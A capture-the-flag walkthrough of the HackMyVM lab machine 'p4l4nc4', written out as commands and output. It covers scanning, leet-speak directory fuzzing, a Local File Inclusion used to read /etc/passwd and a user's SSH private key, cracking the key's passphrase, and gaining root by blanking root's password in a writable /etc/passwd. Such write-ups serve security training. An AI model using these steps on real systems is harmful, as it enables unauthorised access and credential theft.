# p4l4nc4

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| p4l4nc4 | elpensador | Beginner | HackMyVM |

**Summary:** This beginner-level machine presents a straightforward exploitation pathway beginning with web directory enumeration using leet-speak wordlist construction. The attacker discovers a hidden directory `/n3gr4/` containing a PHP file `m414nj3.php` which is vulnerable to Local File Inclusion through an unsanitized `page` parameter. This LFI vulnerability enables reading arbitrary files from the system, including the SSH private key of the low-privileged user `p4l4nc4`. The private key is encrypted with a passphrase that is successfully cracked using John the Ripper against the rockyou.txt wordlist, yielding the credential "friendster". Upon gaining SSH access as p4l4nc4, the attacker discovers that `/etc/passwd` is world-writable, a critical misconfiguration that allows direct modification of root's password field. By removing the password hash from the root user entry in `/etc/passwd`, the attacker can authenticate as root without requiring a password, completing the privilege escalation chain and obtaining both user and root flags.

---

## Reconnaissance

Network reconnaissance began with identifying the target machine within the local network using a PowerShell scanning utility. The scan revealed the target at IP address 192.168.100.165.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.165 08:00:27:8F:CA:C8 VirtualBox
```

### Service Enumeration

A comprehensive port scan using Nmap was performed against the target to identify available services and their versions. The scan revealed two open ports: SSH on port 22 running OpenSSH 9.2p1 and HTTP on port 80 running Apache httpd 2.4.62.

```bash
nmap -sC -sV -p- -T4 192.168.100.165
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 08:06 WIB
Nmap scan report for 192.168.100.165
Host is up (0.0070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 21:a5:80:4d:e9:b6:f0:db:71:4d:30:a0:69:3a:c5:0e (ECDSA)
|_  256 40:90:68:70:66:eb:f2:6c:f4:ca:f5:be:36:82:d0:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.97 seconds
```

### Web Content Discovery

Web directory discovery was conducted using feroxbuster with an extensive wordlist targeting common file extensions including txt, php, html, log, js, css, jpg, zip, bak, and pem files.

```bash
feroxbuster -u http://192.168.100.165 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,log,js,css,jpg,zip,bak,pem -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.165/
 🚩  In-Scope Url          │ 192.168.100.165
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, log, js, css, jpg, zip, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       25l      127w    10359c http://192.168.100.165/icons/openlogo-75.png
200      GET      368l      933w    10701c http://192.168.100.165/
200      GET      368l      933w    10701c http://192.168.100.165/index.html
200      GET        2l      205w     1432c http://192.168.100.165/robots.txt
```

### robots.txt Analysis

The robots.txt file contained Portuguese text describing the giant black antelope (Palanca Negra Gigante), a rare African species native to Angola. This discovery led to the hypothesis that the machine's challenge involves using Portuguese-related keywords for directory and file discovery. The content was:

```bash
curl -s http://192.168.100.165/robots.txt
A palanca-negra-gigante é uma subespécie de palanca-negra. De todas as subespécies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespécie é endêmica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, após a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivência de múltiplas espécies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e Investigação Científica da Universidade Católica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidências fotográficas do único rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistência da população após um duro período de guerra.
Atualmente, a Palanca Negra Gigante é considerada como o símbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleção de futebol angolana é denominada de palancas-negras e a companhia aérea angolana, TAAG, tem este antílope como símbolo. Palanca é também o nome de uma das subdivisões da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antílopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual
```

### Custom Wordlist Construction

Using CeWL (Custom Word Extractor), a wordlist was generated from the robots.txt content. This wordlist was then transformed into leet-speak variants to create multiple case permutations for fuzzing operations. The wordlist was augmented with common leet-speak substitutions where characters were replaced with numbers (e.g., "a" to "4", "e" to "3", "i" to "1").

```bash
cewl http://192.168.100.165/robots.txt -w wordlists.txt

CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

cat wordlists.txt
Angola
Palanca
subespécie
como
angolana
que
...
espécie
múltiplas
sobrevivência
```

The wordlist was then transformed to include uppercase and lowercase variations using text transformation:

```bash
tr '[:upper:]' '[:lower:]' < wordlists_leet.txt > wordlists_leet_lower.txt
tr '[:lower:]' '[:upper:]' < wordlists_leet.txt > wordlists_leet_upper.txt
cat wordlists_leet.txt wordlists_leet_lower.txt wordlists_leet_upper.txt | sort -u > wordlists_leet_full.txt
```

---

## Initial Access

### Hidden Directory Discovery

Using ffuf with the custom leet-speak wordlist, the first enumeration pass against the root directory revealed a directory named `n3gr4` (leet-speak for "negra") with a 301 redirect status:

```bash
ffuf -u http://192.168.100.165/FUZZ -w ./wordlists_leet_full.txt -e .txt,.php,.html,.zip

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.165/FUZZ
 :: Wordlist         : FUZZ: /tmp/p4l4nc4/wordlists_leet_full.txt
 :: Extensions       : .txt .php .html .zip
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

n3gr4                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 19ms]
:: Progress: [1265/1265] :: Job [1/1] :: 105 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

### Vulnerable PHP File Discovery

A second enumeration pass was conducted within the discovered `n3gr4` directory, revealing a PHP file named `m414nj3.php` (leet-speak for "malanje", a city in Angola):

```bash
ffuf -u http://192.168.100.165/n3gr4/FUZZ -w ./wordlists_leet_full.txt -e .txt,.php,.html,.zip

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.165/n3gr4/FUZZ
 :: Wordlist         : FUZZ: /tmp/p4l4nc4/wordlists_leet_full.txt
 :: Extensions       : .txt .php .html .zip
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

m414nj3.php             [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 147ms]
:: Progress: [1265/1265] :: Job [1/1] :: 96 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

### Parameter Enumeration

The `m414nj3.php` file returned a 500 error when accessed without parameters, suggesting missing required arguments. Parameter fuzzing was performed to identify the correct parameter name:

```bash
ffuf -u http://192.168.100.165/n3gr4/m414nj3.php?FUZZ=/etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.165/n3gr4/m414nj3.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

page                    [Status: 200, Size: 1066, Words: 5, Lines: 23, Duration: 41ms]
:: Progress: [6453/6453] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

### Local File Inclusion Exploitation

The parameter `page` was confirmed to be vulnerable to Local File Inclusion. Testing with `/etc/passwd` demonstrated successful file disclosure. The system user list was extracted showing various system accounts and notably the presence of the user `p4l4nc4`:

```bash
curl http://192.168.100.165/n3gr4/m414nj3.php?page=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
```

### SSH Private Key Retrieval

The LFI vulnerability was leveraged to retrieve the private SSH key of the `p4l4nc4` user from the standard SSH directory:

```bash
curl http://192.168.100.165/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
............................[REDACTED]................................
OJEM2NZSUU52PExgYtSXwO5aDy70oKiu0pbifoYOm19hlYwYWOOa6s+oW2FG+aXO8WIeEa
muaZDiXw==
-----END OPENSSH PRIVATE KEY-----
```

The key was saved locally with appropriate file permissions:

```bash
curl http://192.168.100.165/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa > id_rsa && chmod 600 id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1856 100  1856   0     0 290863     0  --:--:-- --:--:-- 309333
```

### SSH Key Passphrase Cracking

The private key was protected with a passphrase. An attempt to extract the public key without the passphrase failed, prompting the need for passphrase recovery:

```bash
ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa":
Load key "id_rsa": incorrect passphrase supplied to decrypt private key
```

The private key was converted to a format compatible with John the Ripper using ssh2john:

```bash
ssh2john id_rsa > id_rsa.hash
```

John the Ripper was executed against the hash using the rockyou.txt wordlist, successfully cracking the passphrase:

```bash
john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fri[REDACTED]       (id_rsa)
1g 0:00:00:39 DONE (2026-04-10 19:56) 0.02524g/s 16.15p/s 16.15c/s 16.15C/s mariah..pebbles
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### SSH Authentication

With the passphrase "friendster" obtained, the public key was successfully extracted:

```bash
ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa":
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrXZ98DYMrn/[REDACTED]/F43+1CxQE2ngwPiejJEeJZ0PEkQu3nZTK1k7WpJzVnhpqbHGlwKWbfvMKh27Y2gp root@4ng014
```

SSH access was established to the target machine using the recovered private key. The initial user enumeration confirmed successful authentication and revealed group membership including sudo access:

```bash
ssh -i id_rsa p4l4nc4@192.168.100.165
p4l4nc4@192.168.100.165's password:
Linux 4ng014 6.1.0-27-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.115-1 (2024-11-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 13 17:10:08 2024 from 192.168.1.78
p4l4nc4@4ng014:~$ id
uid=1000(p4l4nc4) gid=1000(p4l4nc4) groups=1000(p4l4nc4),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

The user flag was successfully retrieved from the home directory:

```bash
p4l4nc4@4ng014:~$ ls -la
total 36
drwxr-xr-x 4 p4l4nc4 p4l4nc4 4096 Nov 13  2024 .
drwxr-xr-x 3 root    root    4096 Nov 13  2024 ..
-rw------- 1 p4l4nc4 p4l4nc4 3084 Nov 13  2024 .bash_history
-rw-r--r-- 1 p4l4nc4 p4l4nc4  220 Nov 13  2024 .bash_logout
-rw-r--r-- 1 p4l4nc4 p4l4nc4 3526 Nov 13  2024 .bashrc
drwxr-xr-x 3 p4l4nc4 p4l4nc4 4096 Nov 13  2024 .local
-rw-r--r-- 1 p4l4nc4 p4l4nc4  807 Nov 13  2024 .profile
drwxr-xr-x 2 p4l4nc4 p4l4nc4 4096 Nov 13  2024 .ssh
-rw-r--r-- 1 p4l4nc4 p4l4nc4    0 Nov 13  2024 .sudo_as_admin_successful
-rw-r--r-- 1 p4l4nc4 p4l4nc4   46 Nov 13  2024 user.txt
```

---

## Privilege Escalation

### System Permission Analysis

Upon gaining shell access as the `p4l4nc4` user, a system-wide search for writable files in the `/etc` directory was performed. The search revealed an unusual and critical misconfiguration: the `/etc/passwd` file was writable by unprivileged users:

```bash
p4l4nc4@4ng014:~$ find /etc -writable 2>/dev/null
/etc/passwd
```

### Root Entry Modification

The `/etc/passwd` file was modified using nano text editor. The root user entry was located and the password hash was removed, leaving the password field empty. This allows authentication as root without entering a password:

```bash
p4l4nc4@4ng014:~$ nano /etc/passwd
p4l4nc4@4ng014:~$ cat /etc/passwd | grep root
root::0:0:root:/root:/bin/bash
```

The modified entry changed the original `root:x:0:0:root:/root:/bin/bash` to `root::0:0:root:/root:/bin/bash` by removing the "x" (password placeholder).

### Root Access Achievement

With the root password field emptied, direct authentication as the root user was possible without providing a password. The su command was executed to switch to the root user:

```bash
p4l4nc4@4ng014:~$ su - root
root@4ng014:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
4ng014
```

### Flag Retrieval

Both the user flag and root flag were successfully extracted:

```bash
root@4ng014:~# cat /home/p4l4nc4/user.txt /root/root.txt
HMV{6cf[REDACTED]}
HMV{4c3[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning and port enumeration identified SSH and Apache HTTP services running on the target machine. Web content discovery through feroxbuster revealed standard Apache files and a robots.txt containing Portuguese text about the Palanca Negra Gigante (giant black antelope).

2. **Vulnerability Discovery**: The Portuguese content in robots.txt provided clues for directory naming conventions. Custom wordlists were generated and leet-speak variants were created (e.g., "negra" became "n3gr4", "malanje" became "m414nj3"). FFUF fuzzing discovered the hidden directory `/n3gr4/` and the vulnerable file `m414nj3.php`.

3. **Exploitation**: Parameter fuzzing identified the `page` parameter vulnerable to Local File Inclusion. Through the LFI vulnerability, arbitrary files were read including `/etc/passwd` to enumerate users and `/home/p4l4nc4/.ssh/id_rsa` to obtain the SSH private key.

4. **Credential Recovery**: The retrieved SSH private key was encrypted with a passphrase. The key was converted to a hash format and successfully cracked using John the Ripper against the rockyou.txt wordlist, yielding the passphrase "friendster".

5. **Privilege Escalation**: With SSH access established, a system scan revealed that `/etc/passwd` was world-writable due to improper file permissions. The root user entry was modified by removing the password hash, allowing unauthenticated access. The su command was used to switch to root without requiring a password, granting complete system control and access to both user and root flags.

